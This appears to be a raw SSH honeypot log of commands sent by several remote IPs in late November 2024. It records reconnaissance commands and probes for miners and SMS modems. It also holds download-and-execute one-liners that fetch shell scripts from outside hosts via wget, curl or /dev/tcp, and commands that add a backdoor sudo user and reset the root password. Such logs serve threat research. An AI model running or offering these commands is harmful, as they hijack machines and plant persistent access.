start
2024-11-29 14:40:17.460267 - ('141.0.99.244', 44570) - /ip cloud print
2024-11-29 14:40:18.492669 - ('141.0.99.244', 44570) - ifconfig
2024-11-29 14:40:19.332763 - ('141.0.99.244', 44570) - uname -a
2024-11-29 14:40:20.172619 - ('141.0.99.244', 44570) - cat /proc/cpuinfo
2024-11-29 14:40:21.012705 - ('141.0.99.244', 44570) - ps | grep '[Mm]iner'
2024-11-29 14:40:21.853599 - ('141.0.99.244', 44570) - ps -ef | grep '[Mm]iner'
2024-11-29 14:40:22.692760 - ('141.0.99.244', 44570) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-11-29 14:40:23.533050 - ('141.0.99.244', 44570) - echo Hi | cat -n
2024-11-29 15:22:56.516609 - ('87.120.113.231', 43430) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-11-29 19:09:38.304639 - ('46.19.143.66', 57710) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 gTrqfDDT) system && sudo usermod -aG sudo system
2024-11-29 19:09:38.807707 - ('46.19.143.66', 57710) - lscpu && echo -e "gTrqfDDT\ngTrqfDDT" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
2024-11-29 22:23:41.447127 - ('46.19.143.66', 37282) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 6fyVNtDH) system && sudo usermod -aG sudo system
2024-11-29 22:23:42.375982 - ('46.19.143.66', 37282) - lscpu && echo -e "6fyVNtDH\n6fyVNtDH" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
2024-11-30 01:04:46.266930 - ('94.141.120.99', 45806) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:04:47.273751 - ('94.141.120.99', 45824) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:04:47.625429 - ('94.141.120.99', 45808) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:04:48.021851 - ('94.141.120.99', 45806) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:04:48.145660 - ('94.141.120.99', 45840) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:04:48.514899 - ('94.141.120.99', 45824) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:04:48.636529 - ('94.141.120.99', 45838) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:04:48.819050 - ('94.141.120.99', 45808) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:04:49.162832 - ('94.141.120.99', 45806) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:04:49.367657 - ('94.141.120.99', 45840) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:04:49.649871 - ('94.141.120.99', 45824) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:04:49.833717 - ('94.141.120.99', 45838) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:04:49.964656 - ('94.141.120.99', 45808) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 01:04:50.299725 - ('94.141.120.99', 45806) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
